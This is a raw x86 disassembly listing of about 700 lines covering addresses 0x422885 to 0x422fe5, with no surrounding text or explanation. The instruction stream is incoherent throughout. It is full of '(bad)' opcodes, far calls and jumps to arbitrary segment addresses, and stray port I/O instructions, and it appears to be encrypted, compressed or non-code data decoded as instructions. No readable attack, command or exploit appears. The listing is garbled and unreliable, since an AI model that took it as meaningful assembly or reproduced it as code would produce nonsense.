  422885:	cmp    esp,DWORD PTR [eax+0x4ebcee1c]
  42288b:	fwait
  42288c:	in     eax,0xb5
  42288e:	leave  
  42288f:	rol    BYTE PTR [ecx],1
  422891:	add    BYTE PTR [ecx+0x0],ah
  422894:	add    BYTE PTR [eax],al
  422896:	cli    
  422897:	out    0x81,al
  422899:	mov    eax,esi
  42289b:	mov    esp,0x669c9c08
  4228a0:	dec    esp
  4228a1:	pushf  
  4228a2:	jmp    0x7c0885be
  4228a7:	popf   
  4228a8:	scas   al,BYTE PTR es:[edi]
  4228a9:	aam    0xc4
  4228ab:	add    eax,0xf5243c44
  4228b0:	adc    ebp,ebx
  4228b2:	push   ds
  4228b3:	push   ds
  4228b4:	aaa    
  4228b5:	sbb    eax,edi
  4228b7:	mov    cl,0xeb
  4228b9:	fst    DWORD PTR [ebx]
  4228bb:	adc    al,0x42
  4228bd:	sbb    esp,DWORD PTR [ebp-0x63]
  4228c0:	enter  0x7d62,0x38
  4228c4:	es push ebp
  4228c6:	xlat   BYTE PTR ds:[ebx]
  4228c7:	retf   0x3ae5
  4228ca:	imul   esp,ebx,0xffffff96
  4228cd:	retf   0xe14f
  4228d0:	pop    ds
  4228d1:	(bad)  
  4228d2:	shl    ecx,1
  4228d4:	mov    ecx,0x166a4295
  4228d9:	ss clc 
  4228db:	mov    cl,0xd
  4228dd:	inc    ebp
  4228de:	jbe    0x422940
  4228e0:	and    BYTE PTR [ecx],bl
  4228e2:	mov    al,0x20
  4228e4:	mov    edx,esp
  4228e6:	and    ah,bl
  4228e8:	frstor [ecx]
  4228ea:	pop    ebx
  4228eb:	jl     0x4228cb
  4228ed:	adc    dl,BYTE PTR [edx-0x324b511b]
  4228f3:	add    BYTE PTR [eax+0x45],bh
  4228f6:	xlat   BYTE PTR ds:[ebx]
  4228f7:	add    BYTE PTR [eax],al
  4228f9:	add    BYTE PTR [eax],al
  4228fb:	add    BYTE PTR [eax],al
  4228fd:	add    BYTE PTR [eax+edx*4-0x32223f23],dl
  422904:	popf   
  422905:	aam    0x57
  422907:	(bad)
  42290b:	sub    esi,esp
  42290d:	sbb    DWORD PTR [edx],ebp
  42290f:	rol    DWORD PTR [ecx],1
  422911:	add    BYTE PTR [ecx+0x0],ah
  422914:	add    BYTE PTR [eax],al
  422916:	ds push edi
  422918:	sub    eax,0xab24629a
  42291d:	add    ch,BYTE PTR [esi+0xf9be3b5]
  422923:	clc    
  422924:	push   ebp
  422925:	lea    eax,[ecx+0x6726f8cb]
  42292b:	gs daa 
  42292d:	into   
  42292e:	fstp   DWORD PTR [eax+ebp*4]
  422931:	pop    ss
  422932:	cmp    eax,0xdb7fe23f
  422937:	fild   WORD PTR [ecx]
  422939:	nop
  42293a:	cs fcomp st(5)
  42293d:	mov    esp,DWORD PTR [eax]
  42293f:	or     dl,BYTE PTR [esi-0x4]
  422942:	pusha  
  422943:	and    dl,dl
  422945:	ret    0x8afe
  422948:	jle    0x42291f
  42294a:	call   0x61d7:0xe1910d34
  422951:	xor    eax,0x518e9c61
  422956:	sbb    eax,0xcf00481c
  42295b:	js     0x422914
  42295d:	ins    DWORD PTR es:[edi],dx
  42295e:	or     DWORD PTR [esi],eax
  422960:	push   ds
  422961:	out    dx,al
  422962:	out    dx,al
  422963:	dec    edi
  422964:	xor    BYTE PTR [ecx],dl
  422966:	inc    eax
  422967:	repnz xor esi,DWORD PTR [ecx]
  42296a:	jno    0x422974
  42296c:	mov    ebp,0x5b3e8198
  422971:	shr    DWORD PTR [edi+0x518dafae],1
  422977:	add    BYTE PTR [eax],al
  422979:	add    BYTE PTR [eax],al
  42297b:	add    BYTE PTR [eax],al
  42297d:	add    ah,dh
  42297f:	mov    dl,0x32
  422981:	(bad)  
  422982:	jbe    0x42295a
  422984:	hlt    
  422985:	mov    dl,0xb1
  422987:	and    al,0xfe
  422989:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42298a:	jns    0x42298c
  42298c:	lods   al,BYTE PTR ds:[esi]
  42298d:	xchg   DWORD PTR [ebx+0x610001d1],ecx
  422993:	add    BYTE PTR [eax],al
  422995:	add    ah,cl
  422997:	rol    DWORD PTR [ebp+0x235e01b3],1
  42299d:	aam    0x0
  42299f:	mov    DWORD PTR [esi+0x1c4f2937],edi
  4229a5:	push   ebx
  4229a6:	shl    BYTE PTR [ecx],cl
  4229a8:	retf   
  4229a9:	mov    al,ds:0x4c5799a8
  4229ae:	sub    BYTE PTR [ebx+edx*1-0x786da0e1],0xe2
  4229b6:	in     eax,dx
  4229b7:	mul    BYTE PTR [ecx+0x6937dca3]
  4229bd:	cld    
  4229be:	mov    edx,0x558259a2
  4229c3:	jno    0x4229e3
  4229c5:	or     eax,DWORD PTR [esp+edi*1+0x2871ca7f]
  4229cc:	daa    
  4229cd:	xchg   bh,dh
  4229cf:	mov    cl,0xd9
  4229d1:	nop
  4229d2:	pushf  
  4229d3:	pop    ss
  4229d4:	push   esp
  4229d5:	sbb    cl,BYTE PTR [esi-0x4fe0459b]
  4229db:	jo     0x422a41
  4229dd:	sub    BYTE PTR [ecx-0x6f9003d5],al
  4229e3:	inc    ecx
  4229e4:	je     0x4229ea
  4229e6:	jae    0x422a0d
  4229e8:	xchg   ecx,eax
  4229e9:	lahf   
  4229ea:	pop    ss
  4229eb:	icebp  
  4229ec:	push   ecx
  4229ed:	outs   dx,DWORD PTR ds:[esi]
  4229ee:	mov    ebx,0xfa34af0c
  4229f3:	add    eax,0x726fc3
  4229f8:	add    BYTE PTR [eax],al
  4229fa:	add    BYTE PTR [eax],al
  4229fc:	add    BYTE PTR [eax],al
  4229fe:	xor    dl,bl
  422a00:	into   
  422a01:	mov    ds:0xd37ebfef,al
  422a06:	sub    edi,DWORD PTR [esi]
  422a08:	out    0x3f,eax
  422a0a:	cwde   
  422a0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422a0c:	push   ebp
  422a0d:	or     ah,ch
  422a0f:	rol    DWORD PTR [ecx],1
  422a11:	add    BYTE PTR [ecx+0x0],ah
  422a14:	add    BYTE PTR [eax],al
  422a16:	in     al,dx
  422a17:	xchg   ecx,edi
  422a19:	mov    cl,0x9e
  422a1b:	or     DWORD PTR [edi],0xffffffc0
  422a1e:	sub    edi,edi
  422a20:	int    0x22
  422a22:	inc    eax
  422a23:	enter  0xe830,0x4f
  422a27:	jg     0x422a2e
  422a29:	bound  edx,QWORD PTR [eax]
  422a2b:	(bad)
  422a2f:	ins    DWORD PTR es:[edi],dx
  422a30:	or     eax,0xa54f774d
  422a35:	or     al,0x56
  422a37:	jb     0x4229c8
  422a39:	inc    edi
  422a3a:	jmp    0x3b3b:0xaddff581
  422a41:	outs   dx,DWORD PTR ds:[esi]
  422a42:	in     eax,dx
  422a43:	jbe    0x422a19
  422a45:	aas    
  422a46:	sbb    ch,BYTE PTR [ecx+0x58]
  422a49:	mov    ecx,ebp
  422a4b:	and    edi,DWORD PTR [eax+0x59]
  422a4e:	pop    esi
  422a4f:	jmp    FWORD PTR [ebx-0x7f]
  422a52:	xchg   ebx,eax
  422a53:	(bad)  
  422a54:	mov    edi,0x42962138
  422a59:	je     0x422a3b
  422a5b:	xchg   DWORD PTR ds:0x9235cd63,edi
  422a61:	mov    eax,ds:0x51a8c7cd
  422a66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422a67:	or     eax,0x61665c84
  422a6c:	js     0x422a39
  422a6e:	(bad)  
  422a6f:	jnp    0x422a53
  422a71:	aad    0x1c
  422a73:	repz loopne 0x422ace
  422a76:	imul   eax,DWORD PTR [eax],0x0
  422a7c:	add    BYTE PTR [eax],al
  422a7e:	fucomi st,st(5)
  422a80:	outs   dx,BYTE PTR ds:[esi]
  422a81:	and    bh,BYTE PTR [esi-0x5d]
  422a84:	(bad)  
  422a86:	pop    esi
  422a87:	(bad)  
  422a88:	mov    DWORD PTR [ebp+0x1964e8aa],ecx
  422a8e:	dec    ebp
  422a8f:	rol    BYTE PTR [ecx],cl
  422a91:	add    BYTE PTR [ecx+0x0],ah
  422a94:	add    BYTE PTR [eax],al
  422a96:	pop    ebp
  422a97:	adc    edx,ecx
  422a99:	push   ecx
  422a9a:	pop    ecx
  422a9b:	dec    ebx
  422a9c:	or     ch,BYTE PTR [ebx-0x5112304a]
  422aa2:	mov    ebx,0x24702236
  422aa7:	lea    esp,[edx+0x53c29a7c]
  422aad:	jecxz  0x422b25
  422aaf:	or     dl,BYTE PTR [ebx]
  422ab1:	sbb    DWORD PTR [ecx-0x3],esi
  422ab4:	xchg   ebp,eax
  422ab5:	push   edx
  422ab6:	mov    eax,0x75ae5119
  422abb:	(bad)  
  422abc:	mov    esi,DWORD PTR [edi-0x2981ce77]
  422ac2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422ac3:	inc    ebx
  422ac4:	stc    
  422ac5:	cdq    
  422ac6:	out    dx,al
  422ac7:	jo     0x422b23
  422ac9:	mov    al,BYTE PTR [ebx-0x13]
  422acc:	inc    ecx
  422acd:	stc    
  422ace:	sbb    dh,BYTE PTR [eax]
  422ad0:	retf   
  422ad1:	mov    BYTE PTR [eax],cl
  422ad3:	js     0x422a78
  422ad5:	fbld   TBYTE PTR [esi-0x7c]
  422ad8:	pop    esi
  422ad9:	std    
  422ada:	fstp   QWORD PTR [ecx]
  422adc:	arpl   WORD PTR ds:0xb9d5eec9,cx
  422ae2:	inc    eax
  422ae3:	dec    ebx
  422ae4:	rol    ebp,0xf
  422ae7:	sahf   
  422ae8:	cmc    
  422ae9:	mov    al,ds:0xfd76d781
  422aee:	add    al,0xb7
  422af0:	bound  edx,QWORD PTR [esi-0x23]
  422af3:	mov    cl,0x0
  422af5:	jbe    0x422b33
  422af7:	add    BYTE PTR [eax],al
  422af9:	add    BYTE PTR [eax],al
  422afb:	add    BYTE PTR [eax],al
  422afd:	add    BYTE PTR ds:0x6f976b22,al
  422b03:	(bad)  
  422b05:	mov    dl,0x66
  422b07:	and    BYTE PTR [esi+0x1cfd2d6a],ah
  422b0d:	cwde   
  422b0e:	scas   al,BYTE PTR es:[edi]
  422b0f:	rol    BYTE PTR [ecx],cl
  422b11:	add    BYTE PTR [ecx+0x0],ah
  422b14:	add    BYTE PTR [eax],al
  422b16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422b17:	out    dx,al
  422b18:	jg     0x422aa7
  422b1a:	scas   al,BYTE PTR es:[edi]
  422b1b:	pop    edx
  422b1c:	xor    bh,bh
  422b1e:	scas   al,BYTE PTR es:[edi]
  422b1f:	adc    al,0x61
  422b21:	mov    DWORD PTR [ecx+esi*1+0x77],ebx
  422b25:	fidiv  DWORD PTR [ecx]
  422b27:	int3   
  422b28:	lods   eax,DWORD PTR ds:[esi]
  422b29:	pop    eax
  422b2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422b2b:	push   edi
  422b2c:	leave  
  422b2d:	aaa    
  422b2e:	mov    ch,0x18
  422b30:	mov    dh,0x1a
  422b32:	sbb    BYTE PTR [ebx-0x482f5bf1],bh
  422b38:	rol    DWORD PTR [edi],0x6c
  422b3b:	dec    ebx
  422b3c:	(bad)  
  422b3d:	xor    esi,ebp
  422b3f:	mov    dh,0xc
  422b41:	pop    ecx
  422b42:	add    bl,BYTE PTR [eax-0x4867a0eb]
  422b48:	lods   al,BYTE PTR ds:[esi]
  422b49:	and    ah,BYTE PTR [esi]
  422b4b:	xor    dl,0x72
  422b4e:	je     0x422ae2
  422b50:	lea    edi,[eax]
  422b52:	inc    edx
  422b53:	push   esi
  422b54:	or     BYTE PTR [ecx+0x71a06e99],0x2a
  422b5b:	(bad)  
  422b5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422b5d:	cld    
  422b5e:	fist   WORD PTR [eax+eax*8+0x1f92f8ef]
  422b65:	push   0x521c1344
  422b6a:	arpl   WORD PTR [ebx],cx
  422b6c:	ret    0x3f57
  422b6f:	dec    DWORD PTR [edi]
  422b71:	mul    dl
  422b73:	call   0x0:0x11c3e0
  422b7a:	add    BYTE PTR [eax],al
  422b7c:	add    BYTE PTR [eax],al
  422b7e:	mov    edx,esp
  422b80:	and    al,0xd9
  422b82:	jg     0x422b7d
  422b84:	call   esi
  422b86:	into   
  422b87:	inc    ebp
  422b88:	mov    bh,0x11
  422b8a:	push   ecx
  422b8b:	sbb    DWORD PTR [edi+0x19],edx
  422b8e:	psrlq  mm0,QWORD PTR [ecx]
  422b91:	add    BYTE PTR [ecx+0x0],ah
  422b94:	add    BYTE PTR [eax],al
  422b96:	out    dx,al
  422b97:	sar    cl,1
  422b99:	push   cs
  422b9a:	or     ecx,DWORD PTR ds:0xd1bb1bb9
  422ba0:	adc    bh,bh
  422ba2:	loopne 0x422bb5
  422ba4:	hlt    
  422ba5:	jle    0x422bbb
  422ba7:	arpl   WORD PTR [edx-0x4bf01690],sp
  422bad:	add    BYTE PTR [edi+esi*1+0x3e813f36],ah
  422bb4:	stos   DWORD PTR es:[edi],eax
  422bb5:	(bad)
  422bb8:	in     al,dx
  422bb9:	sub    DWORD PTR [ecx+esi*8+0x20db5d9],edi
  422bc0:	xor    dh,BYTE PTR [edx+0x7b]
  422bc3:	(bad)  
  422bc4:	dec    ebp
  422bc5:	xor    dh,dl
  422bc7:	or     BYTE PTR [eax+0x7b0b8687],bh
  422bcd:	pop    esi
  422bce:	outs   dx,DWORD PTR ds:[esi]
  422bcf:	int    0x5d
  422bd1:	adc    eax,0xf1f348b3
  422bd6:	lds    ecx,FWORD PTR [edi+0x67045f0b]
  422bdc:	daa    
  422bdd:	inc    esi
  422bde:	xchg   edi,eax
  422bdf:	pop    edx
  422be0:	xor    BYTE PTR [eax-0x23],bl
  422be3:	mov    esp,esp
  422be5:	push   esp
  422be6:	les    eax,FWORD PTR [ebp+eax*8-0x5d]
  422bea:	push   eax
  422beb:	pop    es
  422bec:	dec    esp
  422bed:	stc    
  422bee:	mov    dl,BYTE PTR [edi-0x32bccf5e]
  422bf4:	xor    dl,BYTE PTR [ebp+eiz*1+0x0]
  422bf8:	add    BYTE PTR [eax],al
  422bfa:	add    BYTE PTR [eax],al
  422bfc:	add    BYTE PTR [eax],al
  422bfe:	fisubr WORD PTR [ecx]
  422c00:	cwde   
  422c01:	sar    bh,cl
  422c03:	repz fisubr WORD PTR ds:0x4af35f6
  422c0a:	pop    ebp
  422c0b:	mov    al,0x81
  422c0d:	pshufw mm2,mm3,0x1
  422c11:	add    BYTE PTR [ecx+0x0],ah
  422c14:	add    BYTE PTR [eax],al
  422c16:	rcr    DWORD PTR [ebx+ebx*4],1
  422c19:	gs jecxz 0x422bf7
  422c1c:	jp     0x422b9f
  422c1e:	(bad)  
  422c1f:	mov    dh,BYTE PTR [ebp+edi*2-0x47]
  422c23:	mov    cl,0x47
  422c25:	push   esp
  422c26:	leave  
  422c27:	imul   ebx,DWORD PTR [edx+0x3e18ad24],0x45
  422c2e:	mov    dh,0xc
  422c30:	test   DWORD PTR [eax-0xc],edx
  422c33:	call   0x42e9:0xe79c053d
  422c3a:	pop    ss
  422c3b:	arpl   WORD PTR [edx],dx
  422c3d:	pop    ebp
  422c3e:	neg    BYTE PTR [edi+0x6498791a]
  422c44:	mov    eax,ds:0x2be61ff1
  422c49:	xchg   DWORD PTR [edi],edx
  422c4b:	addr16 lahf 
  422c4d:	(bad)  
  422c4e:	in     eax,0x73
  422c50:	test   eax,0xc412a4b6
  422c55:	jmp    DWORD PTR [ebp-0x10]
  422c58:	pusha  
  422c59:	adc    al,0x81
  422c5b:	fsub   DWORD PTR [edi+eax*4]
  422c5e:	neg    DWORD PTR [ebp-0x21081fd8]
  422c64:	push   ebx
  422c65:	call   0xa573:0xcec18953
  422c6c:	add    ch,cl
  422c6e:	loope  0x422c88
  422c70:	shl    esi,cl
  422c72:	imul   ebx,DWORD PTR ds:0x59db28,0x0
  422c79:	add    BYTE PTR [eax],al
  422c7b:	add    BYTE PTR [eax],al
  422c7d:	add    BYTE PTR [esi+0x3f],cl
  422c80:	int3   
  422c81:	sbb    eax,0x7fdffffd
  422c86:	out    dx,eax
  422c87:	loopne 0x422c9f
  422c89:	lods   al,BYTE PTR ds:[esi]
  422c8a:	daa    
  422c8b:	inc    ebx
  422c8c:	mul    DWORD PTR [ecx+0x1d3d1]
  422c92:	popa   
  422c93:	add    BYTE PTR [eax],al
  422c95:	add    ch,cl
  422c97:	adc    al,0x2a
  422c99:	fild   QWORD PTR [ecx+eiz*2]
  422c9c:	icebp  
  422c9d:	popf   
  422c9e:	or     edi,edx
  422ca0:	arpl   WORD PTR [edx],di
  422ca2:	xor    BYTE PTR [esp+edx*4+0x7a],ch
  422ca6:	mov    eax,0x4a6acfc4
  422cab:	adc    edi,edx
  422cad:	and    DWORD PTR [ebx+0x61],ebp
  422cb0:	sub    esp,0xf5c825ea
  422cb6:	xchg   ebx,eax
  422cb7:	push   ds
  422cb8:	xchg   ebx,eax
  422cb9:	in     al,0x2c
  422cbb:	hlt    
  422cbc:	push   es
  422cbd:	int    0xe2
  422cbf:	mov    fs,ebp
  422cc1:	in     al,dx
  422cc2:	clc    
  422cc3:	push   ds
  422cc4:	ins    BYTE PTR es:[edi],dx
  422cc5:	pop    edx
  422cc6:	jge    0x422d3e
  422cc8:	imul   edi,DWORD PTR [ebx+eax*1],0x9de7952a
  422ccf:	dec    edi
  422cd0:	inc    edi
  422cd1:	in     eax,0x43
  422cd3:	fisub  WORD PTR [edi-0x65423fe5]
  422cd9:	xchg   esp,eax
  422cda:	jo     0x422c88
  422cdc:	int3   
  422cdd:	dec    DWORD PTR ds:0x20a8d19e
  422ce3:	add    eax,0x10e8e31c
  422ce8:	iret   
  422ce9:	lock rcr DWORD PTR [esi],1
  422cec:	and    BYTE PTR [edi+0x29078a41],al
  422cf2:	jge    0x422d17
  422cf4:	jp     0x422c7b
  422cf6:	outs   dx,DWORD PTR ds:[esi]
  422cf7:	add    BYTE PTR [eax],al
  422cf9:	add    BYTE PTR [eax],al
  422cfb:	add    BYTE PTR [eax],al
  422cfd:	add    BYTE PTR [esi],bl
  422cff:	test   eax,0x7ff735f6
  422d04:	fild   QWORD PTR [ebx-0x5f9ed871]
  422d0a:	inc    eax
  422d0b:	mov    dl,0xc5
  422d0d:	pop    es
  422d0e:	xor    dl,ah
  422d10:	add    DWORD PTR [eax],eax
  422d12:	popa   
  422d13:	add    BYTE PTR [eax],al
  422d15:	add    BYTE PTR ds:0x1af55ac1,dl
  422d1b:	iret   
  422d1c:	inc    edx
  422d1d:	lods   al,BYTE PTR ds:[esi]
  422d1e:	sbb    BYTE PTR [ecx-0x5b],dl
  422d21:	mov    bh,BYTE PTR [ecx]
  422d23:	dec    esi
  422d24:	out    dx,eax
  422d25:	cmp    BYTE PTR [ebp-0x7388523e],al
  422d2b:	cmp    ebx,edi
  422d2d:	dec    ecx
  422d2e:	(bad)  
  422d2f:	mov    ebp,0xb6c4c4de
  422d34:	pusha  
  422d35:	aas    
  422d36:	pop    ds
  422d37:	fidivr WORD PTR [ebp+0x3e613634]
  422d3d:	jne    0x422d38
  422d3f:	(bad)  
  422d40:	pushf  
  422d41:	jb     0x422d31
  422d43:	or     eax,0xa105eebf
  422d48:	std    
  422d49:	cmp    ecx,ebx
  422d4b:	(bad)  
  422d4d:	mov    al,ds:0xd2d94b15
  422d52:	jbe    0x422d7f
  422d54:	jle    0x422d8d
  422d56:	jmp    0x2a35461e
  422d5b:	sbb    al,0xa9
  422d5d:	jo     0x422dd1
  422d5f:	pusha  
  422d60:	sub    esi,edx
  422d62:	fnsave [edx-0x71]
  422d65:	lds    esi,FWORD PTR [esi+0x5]
  422d68:	scas   eax,DWORD PTR es:[edi]
  422d69:	int    0xc3
  422d6b:	push   es
  422d6c:	dec    edx
  422d6d:	retf   0x3fa3
  422d70:	aam    0x0
  422d72:	xchg   esp,eax
  422d73:	sbb    ah,BYTE PTR [eax+edx*4]
  422d76:	pop    edi
  422d77:	add    BYTE PTR [eax],al
  422d79:	add    BYTE PTR [eax],al
  422d7b:	add    BYTE PTR [eax],al
  422d7d:	add    BYTE PTR [ebx+0x7f2d6de1],bl
  422d83:	lods   eax,DWORD PTR ds:[esi]
  422d84:	fcomi  st,st(7)
  422d86:	sar    BYTE PTR [ebx],cl
  422d88:	(bad)  
  422d89:	add    ch,ah
  422d8b:	fmul   DWORD PTR [esi+edx*1]
  422d8e:	xchg   ebx,eax
  422d8f:	aam    0x1
  422d91:	add    BYTE PTR [ecx+0x0],ah
  422d94:	add    BYTE PTR [eax],al
  422d96:	popf   
  422d97:	inc    eax
  422d98:	test   eax,0x305293c6
  422d9d:	arpl   WORD PTR [ebp+0x15],dx
  422da0:	lea    ecx,[edi+esi*1+0x64]
  422da4:	adc    eax,0xb8b0a621
  422da9:	xchg   edx,eax
  422daa:	fucomi st,st(3)
  422dac:	(bad)  
  422dad:	pop    ebx
  422dae:	test   DWORD PTR [ebx],eax
  422db0:	and    DWORD PTR [esi],edx
  422db2:	mov    eax,ds:0xad0742ef
  422db7:	xor    eax,0xce0bc50e
  422dbc:	pop    ecx
  422dbd:	sahf   
  422dbe:	ins    DWORD PTR es:[edi],dx
  422dbf:	dec    ebp
  422dc0:	lods   al,BYTE PTR ds:[esi]
  422dc1:	pop    ds
  422dc2:	mov    al,ds:0x6a9078f9
  422dc7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422dc8:	mov    ch,0xc4
  422dca:	or     ebp,esi
  422dcc:	out    dx,eax
  422dcd:	sti    
  422dce:	stc    
  422dcf:	sub    eax,0x8b74fdc0
  422dd4:	retf   
  422dd5:	fimul  DWORD PTR [eax]
  422dd7:	sti    
  422dd8:	push   es
  422dd9:	pop    edi
  422dda:	push   esp
  422ddb:	rol    BYTE PTR [ebx],0xf4
  422dde:	mov    fs,WORD PTR [ebx-0x6d5a112d]
  422de4:	adc    ebx,DWORD PTR [esi-0x57a09b8f]
  422dea:	xchg   ebp,eax
  422deb:	or     eax,0x73bbe65f
  422df0:	pusha  
  422df1:	imul   ebp,edx,0x46ecd387
  422df7:	add    BYTE PTR [eax],al
  422df9:	add    BYTE PTR [eax],al
  422dfb:	add    BYTE PTR [eax],al
  422dfd:	add    BYTE PTR [eax],cl
  422dff:	div    DWORD PTR [edi+0x4a]
  422e02:	dec    edx
  422e04:	cmp    eax,0x2e8eedf7
  422e09:	dec    eax
  422e0a:	jno    0x422e53
  422e0c:	jns    0x422e7f
  422e0e:	hlt    
  422e0f:	aam    0x1
  422e11:	add    BYTE PTR [ecx+0x0],ah
  422e14:	add    BYTE PTR [eax],al
  422e16:	sahf   
  422e17:	sub    DWORD PTR [eax-0x7f],eax
  422e1a:	fs mov bl,0x2a
  422e1d:	enter  0xffd5,0xe7
  422e21:	jmp    0xad33:0x534e2948
  422e28:	stc    
  422e29:	sbb    DWORD PTR [eax+0x7f23bc5b],eax
  422e2f:	cmp    DWORD PTR [esi],esi
  422e31:	das    
  422e32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422e33:	jmp    0xdc03:0xcd11c2cf
  422e3a:	and    eax,0xbb8d158c
  422e3f:	jns    0x422eb5
  422e41:	jmp    0xdff2:0xb40a5d8e
  422e48:	jae    0x422e61
  422e4a:	arpl   WORD PTR [edx+0x2],dx
  422e4d:	add    DWORD PTR ds:[esi-0x56677694],ecx
  422e54:	cmp    cl,bl
  422e56:	inc    ebx
  422e57:	inc    ebx
  422e58:	add    eax,0x741a6cca
  422e5d:	mov    esi,0x27e21886
  422e62:	aas    
  422e63:	mov    bh,0x24
  422e65:	adc    al,0x43
  422e67:	mov    ?,WORD PTR [edi+0x53]
  422e6a:	fcmovne st,st(3)
  422e6c:	push   ds
  422e6d:	sar    DWORD PTR [edx+0x70],1
  422e70:	adc    BYTE PTR [ebp+0x1b],al
  422e73:	out    0x64,al
  422e75:	ins    DWORD PTR es:[edi],dx
  422e76:	mov    edx,0x0
  422e7b:	add    BYTE PTR [eax],al
  422e7d:	add    BYTE PTR [esi],dh
  422e7f:	arpl   WORD PTR [eax-0x10],bp
  422e82:	jge    0x422e7f
  422e84:	mov    esi,0x8c7853e7
  422e89:	daa    
  422e8a:	test   BYTE PTR [ecx],al
  422e8c:	test   DWORD PTR [ebx+0x55],esi
  422e8f:	aad    0x1
  422e91:	add    BYTE PTR [ecx+0x0],ah
  422e94:	add    BYTE PTR [eax],al
  422e96:	adc    al,0x1f
  422e98:	jg     0x422f01
  422e9a:	or     ah,BYTE PTR es:[ebp+eax*4+0x75f76c8c]
  422ea2:	retf   0x101e
  422ea5:	rcl    BYTE PTR [esi+ebp*8+0x10],cl
  422ea9:	mov    ebx,0x5bfdbcc6
  422eae:	loope  0x422efd
  422eb0:	cdq    
  422eb1:	inc    edi
  422eb2:	ret    
  422eb3:	imul   ebx
  422eb5:	pop    eax
  422eb6:	push   edx
  422eb7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422eb8:	scas   eax,DWORD PTR es:[edi]
  422eb9:	or     eax,0xfbd558cd
  422ebe:	mov    bl,0x5
  422ec0:	test   DWORD PTR [edi+0x0],esi
  422ec3:	mov    eax,0x1f7331bf
  422ec8:	lods   al,BYTE PTR ds:[esi]
  422ec9:	out    0x4c,eax
  422ecb:	or     eax,0xc8547e84
  422ed0:	sti    
  422ed1:	add    dl,dh
  422ed3:	xchg   ebp,eax
  422ed4:	mov    ecx,0xe71555ff
  422ed9:	iret   
  422eda:	fidivr DWORD PTR [edi]
  422edc:	sar    ecx,cl
  422ede:	aaa    
  422edf:	dec    ebx
  422ee0:	mov    edi,0x32d49898
  422ee5:	push   0x3c
  422ee7:	or     eax,0xf03d4f56
  422eec:	mov    ebp,0xefc5dc16
  422ef1:	call   0xaa:0xa06667ab
  422ef8:	add    BYTE PTR [eax],al
  422efa:	add    BYTE PTR [eax],al
  422efc:	add    BYTE PTR [eax],al
  422efe:	daa    
  422eff:	ss lahf 
  422f01:	xor    DWORD PTR [edi+0x1536afb9],ebx
  422f07:	and    eax,0xf99e075b
  422f0c:	call   0x6100:0x1dce9bb
  422f13:	add    BYTE PTR [eax],al
  422f15:	add    BYTE PTR [ecx-0x3c22a327],al
  422f1b:	lds    esi,FWORD PTR [eax+0xa]
  422f1e:	xchg   esp,eax
  422f1f:	xchg   DWORD PTR [edi+0x32],eax
  422f22:	jecxz  0x422f0f
  422f24:	xor    esp,ebp
  422f26:	sub    edi,eax
  422f28:	test   al,0x4b
  422f2a:	sub    eax,0x6077f09
  422f2f:	call   0xaca1:0x78d6c74f
  422f36:	lea    ecx,[ecx+0x35]
  422f39:	add    eax,0x25b93454
  422f3e:	dec    esp
  422f3f:	jnp    0x422ec5
  422f41:	loope  0x422f08
  422f43:	mov    ebx,0x35bd0b6
  422f48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422f49:	sub    DWORD PTR [ebx+edx*1],ecx
  422f4c:	inc    esi
  422f4d:	and    BYTE PTR [eax],dh
  422f4f:	pusha  
  422f50:	mov    dh,0x8b
  422f52:	dec    edi
  422f53:	ds inc esi
  422f55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422f56:	xor    al,BYTE PTR [edi]
  422f58:	mul    DWORD PTR [esi-0x66c4000f]
  422f5e:	push   esp
  422f5f:	sub    eax,0x189d329f
  422f64:	push   edi
  422f65:	into   
  422f66:	xchg   edx,eax
  422f67:	ret    
  422f68:	push   eax
  422f69:	dec    edx
  422f6a:	jns    0x422fad
  422f6c:	jns    0x422f71
  422f6e:	stos   DWORD PTR es:[edi],eax
  422f6f:	sbb    eax,0x8f9de9ba
  422f74:	pop    ss
  422f75:	add    DWORD PTR [edi],esp
  422f77:	add    BYTE PTR [eax],al
  422f79:	add    BYTE PTR [eax],al
  422f7b:	add    BYTE PTR [eax],al
  422f7d:	add    BYTE PTR [edi],dh
  422f7f:	(bad)  
  422f80:	out    0xc2,eax
  422f82:	mul    ebx
  422f84:	aaa    
  422f85:	cmc    
  422f86:	xchg   ecx,eax
  422f87:	call   0x21dc:0xcb73eef4
  422f8e:	dec    edx
  422f8f:	fld    QWORD PTR [ecx]
  422f91:	add    BYTE PTR [ecx+0x0],ah
  422f94:	add    BYTE PTR [eax],al
  422f96:	xor    ebp,DWORD PTR [ebp+0x130be34d]
  422f9c:	pop    ds
  422f9d:	or     bl,BYTE PTR [edx+0x42]
  422fa0:	add    eax,DWORD PTR [esi+edi*4]
  422fa3:	out    0xf9,eax
  422fa5:	hlt    
  422fa6:	xchg   ecx,eax
  422fa7:	(bad)  
  422fa8:	jb     0x422fbc
  422faa:	jb     0x422f3e
  422fac:	xchg   esp,eax
  422fad:	ds call 0x230e:0xdf20f1b6
  422fb5:	jb     0x422f93
  422fb7:	sub    bh,cl
  422fb9:	fucomip st,st(3)
  422fbb:	lahf   
  422fbc:	pop    ebp
  422fbd:	jo     0x422ff8
  422fbf:	std    
  422fc0:	fxch   st(0)
  422fc2:	inc    eax
  422fc3:	scas   eax,DWORD PTR es:[edi]
  422fc4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422fc5:	(bad)  
  422fc6:	mov    ds:0x8f730f00,eax
  422fcb:	addr16 push ecx
  422fcd:	aas    
  422fce:	inc    eax
  422fcf:	js     0x42303c
  422fd1:	jg     0x422fb7
  422fd3:	inc    esp
  422fd4:	mov    ?,WORD PTR [esi-0x5db9fab3]
  422fda:	mov    al,0x38
  422fdc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422fdd:	cmp    BYTE PTR [edi+0x54],dl
  422fe0:	das    
  422fe1:	xchg   edi,eax
  422fe2:	(bad)  
  422fe3:	in     eax,0x71
  422fe5:	fild   WORD PTR [ebp-0x59]
